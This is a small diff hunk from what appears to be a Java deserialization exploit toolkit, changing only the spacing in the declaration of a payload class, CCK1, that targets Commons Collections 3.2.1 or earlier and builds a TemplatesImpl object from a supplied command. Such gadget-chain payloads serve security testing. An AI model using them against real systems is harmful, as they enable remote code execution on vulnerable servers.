@@ -13,7 +13,7 @@ import java.util.Map;
  * Use CommonsCollectionsK1 to replace CommonsCollections
  * Dependency: CommonsCollections <= 3.2.1
  */
-public class CCK1 implements ObjectPayload{
+public class CCK1 implements ObjectPayload {
     @Override
     public Object getObjectPayload(String command) {
         TemplatesImpl templates = Util.createTemplates(command);
